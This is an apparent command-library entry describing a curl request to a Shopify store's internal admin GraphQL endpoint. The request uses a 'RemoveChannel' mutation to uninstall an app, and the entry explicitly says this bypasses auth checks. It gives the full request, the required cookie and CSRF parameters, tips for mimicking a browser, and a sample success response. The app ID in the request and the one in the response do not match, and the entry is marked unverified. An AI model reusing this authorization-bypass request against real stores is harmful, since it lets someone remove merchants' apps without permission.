---
id: cmd-shopify-remove-channel-graphql
data: >-
  curl -X POST
  'https://sardasigni.myshopify.com/admin/internal/web/graphql/core?operation=RemoveChannel&type=mutation'
  -H 'Host: sardasigni.myshopify.com' -H 'Cookie: your_cookie' -H
  'Content-Length: 367' -H 'Sec-Ch-Ua: " Not;A Brand";v="99", "Google
  Chrome";v="97", "Chromium";v="97"' -H 'X-Csrf-Token:
  IDTTE3Wk-IZtbydxlyA2lQ-UFNQGlLvYcG40' -H 'Sec-Ch-Ua-Mobile: ?0' -H
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36' -H 'Content-Type:
  application/json' -H 'Accept: application/json' -H 'X-Shopify-Web-Force-Proxy:
  1' -H 'Sec-Ch-Ua-Platform: "Windows"' -H 'Origin:
  https://sardasigni.myshopify.com' -H 'Sec-Fetch-Site: same-origin' -H
  'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Accept-Encoding: gzip,
  deflate' -H 'Accept-Language: en-US,en;q=0.9' -d
  '{"operationName":"RemoveChannel","variables":{"input":{"id":"gid://shopify/App/6431853","feedbackDescription":""}},"query":"mutation
  RemoveChannel($input: AppUninstallInput!) {\n appUninstall(input: $input) {\n
  app {\n id\n title\n __typename\n }\n userErrors {\n field\n message\n
  __typename\n }\n __typename\n }\n}\n"}'
tags:
  - graphql
  - shopify
  - remove-channel
type: command
output: >-
  {"data":{"appUninstall":{"app":{"id":"gid:\/\/shopify\/App\/6431859","title":"jzhjzhjz","__typename":"App"},"userErrors":[],"__typename":"AppUninstallPayload"}},"extensions":{"cost":{"requestedQueryCost":10,"actualQueryCost":10,"throttleStatus":{"maximumAvailable":5000.0,"currentlyAvailable":4990,"restoreRate":250.0}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.708Z'
verified: false
validated: true
submitted: true
---
# shopify-remove-channel-graphql

## Command

```bash
curl -X POST 'https://sardasigni.myshopify.com/admin/internal/web/graphql/core?operation=RemoveChannel&type=mutation' -H 'Host: sardasigni.myshopify.com' -H 'Cookie: your_cookie' -H 'Content-Length: 367' -H 'Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"' -H 'X-Csrf-Token: IDTTE3Wk-IZtbydxlyA2lQ-UFNQGlLvYcG40' -H 'Sec-Ch-Ua-Mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'X-Shopify-Web-Force-Proxy: 1' -H 'Sec-Ch-Ua-Platform: "Windows"' -H 'Origin: https://sardasigni.myshopify.com' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -d '{"operationName":"RemoveChannel","variables":{"input":{"id":"gid://shopify/App/6431853","feedbackDescription":""}},"query":"mutation RemoveChannel($input: AppUninstallInput!) {\n appUninstall(input: $input) {\n app {\n id\n title\n __typename\n }\n userErrors {\n field\n message\n __typename\n }\n __typename\n }\n}\n"}'
```

## Description

Alternative GraphQL mutation using RemoveChannel to uninstall an app by treating it as a channel removal, bypassing auth checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id` | Global ID of the app/channel | Yes |
| `feedbackDescription` | Optional feedback string (empty) | No |
| `Cookie` | Authentication cookie | Yes |
| `X-Csrf-Token` | CSRF token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST [endpoint] [headers] -d '[payload with id]'
```

### Advanced Usage

Vary feedbackDescription if needed; match headers to browser.

## Expected Output

JSON with successful removal: {"data":{"appUninstall":{"app":{"id":"gid:\/\/shopify\/App\/6431859","title":"jzhjzhjz","__typename":"App"},"userErrors":[]}}}

## Related

- [[commands/shopify-uninstall-custom-app-graphql]]
- [[procedures/Execute-GraphQL-App-Uninstall-Mutation]]
